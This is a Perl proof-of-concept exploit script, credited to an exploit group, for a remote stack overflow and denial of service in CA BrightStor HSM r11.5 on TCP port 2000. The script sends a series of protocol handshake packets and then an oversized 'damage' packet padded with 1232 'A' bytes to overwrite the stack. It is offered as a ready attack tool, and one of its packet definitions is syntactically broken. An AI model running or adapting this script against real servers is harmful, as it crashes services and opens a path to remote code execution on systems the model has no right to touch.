#!/usr/bin/perl
#
# *
# *     C@@@@@  O@@@@@@@       C@@@@@  O@@@@@@O           C@@@@@@@@@o                                                                              
# *    C@@@@@@@@@@@@@@@@O     C@@@@@@@@@@@@@@@@O      C@@@@@@@@@@@@@o                                                                             
# *    C@@@@@@o  .8@@@@@@.    C@@@@@@o   8@@@@@@.    @@@@@@O     .@@o                                                                             
# *    C@@@@@      @@@@@@c    C@@@@@      @@@@@@c   C@@@@@c                                                                                       
# *    C@@@@@      O@@@@@:    C@@@@@      O@@@@@:   @@@@@@                                                                                        
# *    C@@@@@      O@@@@@:    C@@@@@      O@@@@@:   8@@@@@                                                                                        
# *    C@@@@@      O@@@@@:    C@@@@@      O@@@@@:   :@@@@@@        ::                                                                             
# *    C@@@@@      O@@@@@:    C@@@@@      O@@@@@:    c@@@@@@@Coo8@@@o                                                                             
# *    C@@@@@      O@@@@@:    C@@@@@      O@@@@@:      C@@@@@@@@@@@@o  
# *    
# *   [0x00001010]                                                                        
# *
# * Title: CA BrightStor HSM <= r11.5 Remote Stack Based Overflow /
#DoS
# * For: Windows XP (SP2 Professional) / Windows Server 2003
#(Enterprise Edition)
# * Released by: NiceNameCrew [http://nnc.unkn0wn.eu]
# * Author: boecke <boecke@herzeleid.net>
# * Discovery: iDefense
# * Vulnerability Type: Remote Stack Overflow / DoS
# * Risk: High
# * TCP: 2000
# * 
# * This body, this body holding me, be my reminder here that I am not
#alone.
# *
#

use IO::Socket;

$handshake = 
    "\x14\x00\x00\x00" .#[0x14000000] INIT_BEGIN 
    "\x42\x00\x00\x00" . #[0x42000000] FX_SET_CONSOLE_CREDENTIALS
    "\x07\x00\x00\x00" . #[0x07000000] GUI_FLAGS
    "\x00\x00\x00\x00\x00\x00\x00\x00"; #[0x00000000] END

# 0030  ff d1 7b ef 00 00 14 00  00 00 44 00 00 00 07 00
# ..{..... ..D.....
# 0040  00 00 00 00 00 00 00 00  00 00
# ........ ..      

$handshake_auth =
"\x14\x00\x00\x00\x44\x00\x00\x00\x07\x00\x00\x00" .
    "\x00\x00\x00\x00\x00\x00\x00\x00";

$handshake_auth2 =
"\x14\x00\x00\x00\x03\x00\x00\x00" .
"\x07\x00\x00\x00\x00\x00\x00\x00" .
    "\x08\x00\x00\x00";

$handshake_auth3 =
"\x14\x00\x00\x00\x32\x00\x00\x00" .
"\x07\x00\x00\x00\x00\x00\x00\x00" .
    "\x1C\x00\x00\x00";

$handshake_auth4 =
"\x14\x00\x00\x00\x1C\x00\x00\x00" .
    "\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

# List Network Locations
$drives =
    "\x14\x00\x00\x00\x0F\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

# List Computers on Network (MSHOME)
$computers =
"\x1A\x00\x00\x00" .
"\x27\x00\x00\x00" .
"\x07\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\x4D\x53\x48\x4F\x4D\x45" (MSHOME)

$damage =
"\x40\x05\x00\x00\x1D\x00\x00\x00" .
"\x07\x00\x00\x00\x00\x00\x00\x00" .
"\x00\x00\x00\x00" .
"\x41" x 1232 .
"BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK" .
"LLLLMMMMNNNNOOOOLOLO" .
"\x41\x42\x43\x44" .
"RRRRSSSSTTTTUUUU" .
"VVVVWWWW" .
"\x2E\x41\x3B" .
    "\x00\x00\x00\x00\x00\x00";

if ( $socket = IO::Socket::INET->new( PeerAddr => "127.0.0.1",
				      PeerPort => "2000", Proto =>
				      "TCP" ))
{
    print $socket $handshake;
    recv($socket, $reply, 256, 0);
    print($reply . "\n");

    print $socket $handshake_auth;
    recv($socket, $reply, 256, 0);
    print($reply . "\n");

    print $socket $handshake_auth2;
    recv($socket, $reply, 256, 0);
    print($reply . "\n");

    print $socket $handshake_auth3;
    recv($socket, $reply, 256, 0);
    print($reply . "\n");

    print $socket $handshake_auth4;
    recv($socket, $reply, 256, 0);
    print($reply . "\n");

    print $socket $damage;
    recv($socket, $reply, 256, 0);
    print($reply . "\n");
}
